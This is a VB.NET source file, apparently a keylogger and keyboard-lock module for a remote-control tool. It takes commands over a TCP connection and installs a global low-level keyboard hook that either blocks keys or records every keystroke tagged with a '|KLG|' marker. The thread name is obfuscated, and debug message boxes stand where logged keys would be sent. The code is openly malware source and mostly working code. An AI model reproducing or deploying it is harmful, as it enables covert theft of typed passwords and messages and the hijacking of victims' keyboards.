Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
''||       AUTHOR Arsium       ||
''||       github : https://github.com/arsium       ||
Public Class MainCL


    Public Shared ghjk As New Thread(AddressOf gdzbfhbjedzfhujnezdfhjezdfhjezfhjdgsfegrjk)
    Public Shared B As Boolean = False
    Public Shared BB As Boolean = False
    Public Shared Sub ST(ByVal k As TcpClient, ByVal l As String)
        '   MessageBox.Show("Waqdqsdt")
        ' StartKeylogger()
        Dim h As String() = Split(l, "|SP2|")
        If h(1) = "|LCKKB|" Then
            MessageBox.Show("LCKKB")
            BB = True
            B = False
            ghjk.Start()

        ElseIf h(1) = "|STARTKBLG|" Then
            ' MessageBox.Show("STARTKBLG")
            BB = True
            B = True
            ghjk.Start()

        ElseIf h(1) = "|STOPKBLG|" Then

            ' MessageBox.Show("STOPKBLG")
            BB = False
            ghjk.Start()

        End If



    End Sub

    Public Shared Sub gdzbfhbjedzfhujnezdfhjezdfhjezfhjdgsfegrjk()


        Dim objCurrentModule As ProcessModule = Process.GetCurrentProcess().MainModule

        Dim objKeyboardProcess As New LowLevelKeyboardProc(AddressOf captureKey)
        Dim curProcess As Process = Process.GetCurrentProcess()
        ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(curProcess.ProcessName), 0)

        Application.Run()
    End Sub
    ''
    ' SOLUTION ADAPTED FROM : http://geekswithblogs.net/aghausman/archive/2009/04/26/disable-special-keys-in-win-app-c.aspx and others samples of low-level codes written in c#
    '' Rewritten By Arsium in VBNET
    ''
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Public Shared Function SetWindowsHookEx(ByVal id As Integer, ByVal callback As LowLevelKeyboardProc, ByVal hMod As IntPtr, ByVal dwThreadId As UInteger) As IntPtr

    End Function
    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Public Shared Function GetModuleHandle(ByVal name As String) As IntPtr

    End Function

    <StructLayout(LayoutKind.Sequential)>
    Private Structure KBDLLHOOKSTRUCT
        Public key As Keys
        Public scanCode As Integer
        Public flags As Integer
        Public time As Integer
        Public extra As IntPtr
    End Structure

    Public Delegate Function LowLevelKeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr

    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Public Shared Function UnhookWindowsHookEx(ByVal hook As IntPtr) As Boolean

    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function CallNextHookEx(ByVal hook As IntPtr, ByVal nCode As Integer, ByVal wp As IntPtr, ByVal lp As IntPtr) As IntPtr

    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Auto)>
    Private Shared Function GetAsyncKeyState(ByVal key As Keys) As Short

    End Function
    Public Shared ptrHook As IntPtr

    Public Shared Function captureKey(ByVal nCode As Integer, ByVal wp As IntPtr, ByVal lp As IntPtr)

        ' If BB = False Then


        Dim oez As Boolean = False
        Dim AlftGr As Boolean = False



        If nCode >= 0 Then


            If BB = True Then
                If B = True Then

                    Dim objKeyInfo As KBDLLHOOKSTRUCT = CType(Marshal.PtrToStructure(lp, GetType(KBDLLHOOKSTRUCT)), KBDLLHOOKSTRUCT)

                    If objKeyInfo.key = Keys.LWin Then
                        Return CType(1, IntPtr)
                    End If

                    If objKeyInfo.key = Keys.LControlKey Then
                        Return CType(1, IntPtr)
                    End If

                    If wp = &H100 Then

                        Return wp


                    End If


                    If wp = &H101 Then

                        Return wp


                    End If


                    If wp = &H105 Then

                        Return wp


                    End If

                    If wp = &H104 Then
                        Return wp
                    End If


                Else




                    Dim objKeyInfo As KBDLLHOOKSTRUCT = CType(Marshal.PtrToStructure(lp, GetType(KBDLLHOOKSTRUCT)), KBDLLHOOKSTRUCT)

                    '  If objKeyInfo.key = Keys.LWin Then
                    ' Return CType(1, IntPtr)
                    '   End If



                    If GetAsyncKeyState(Keys.LShiftKey) Then
                        oez = True
                    End If



                    If GetAsyncKeyState(Keys.LControlKey) & GetAsyncKeyState(Keys.Alt) Then
                        '   If F2.SCRLK Then
                        '   Return CType(1, IntPtr)
                        ' End If
                        ' 
                        MessageBox.Show("s")

                        AlftGr = True
                    End If








                    If wp = &H100 Then 'WMKEYDOWN

                        '   Return wp



                        If oez = True And objKeyInfo.key <> Keys.LShiftKey Then
                            '  MessageBox.Show(objKeyInfo.key.ToString.ToUpper)
                            Dim j = objKeyInfo.key.ToString.ToUpper

                            Dim hj As String = j & "|KLG|"

                            MessageBox.Show(hj)

                        ElseIf AlftGr = True And objKeyInfo.key <> Keys.RMenu Then

                            MessageBox.Show("AltGR + " & objKeyInfo.key.ToString)
                        Else

                            If Not objKeyInfo.key = Keys.LShiftKey Then
                                '   MessageBox.Show(objKeyInfo.key.ToString.ToLower)


                                Dim j = objKeyInfo.key.ToString.ToLower


                                Dim hj As String = j & "|KLG|"
                                MessageBox.Show(hj)

                            End If

                            '  HelperSTR(objKeyInfo.key.ToString)
                        End If



                    End If













                    If wp = &H104 Then  'SYSKEYDOWN



                        Dim hj As String = objKeyInfo.key.ToString & "|KLG|"

                        MessageBox.Show(hj)

                    End If

                    'LMenu = ALT
                    'LControlKeyRMenu = AltGR
                    '   Return wp
                End If



            Else

                Exit Function
                Return CallNextHookEx(ptrHook, nCode, wp, lp)
            End If

            Return CallNextHookEx(ptrHook, nCode, wp, lp)


        End If





        '   Else

        '  Return CallNextHookEx(ptrHook, nCode, wp, lp)
        ' End If
    End Function


End Class
